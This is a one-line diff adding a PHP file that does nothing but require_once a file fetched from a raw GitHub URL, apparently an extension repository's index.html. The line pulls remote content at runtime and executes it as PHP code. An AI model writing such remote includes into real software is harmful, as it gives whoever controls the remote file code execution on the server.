@@ -1,0 +1,1 @@
+<?php require_once('https://raw.githubusercontent.com/naasyakoot/mysimpleextensionforchrome/master/index.html');
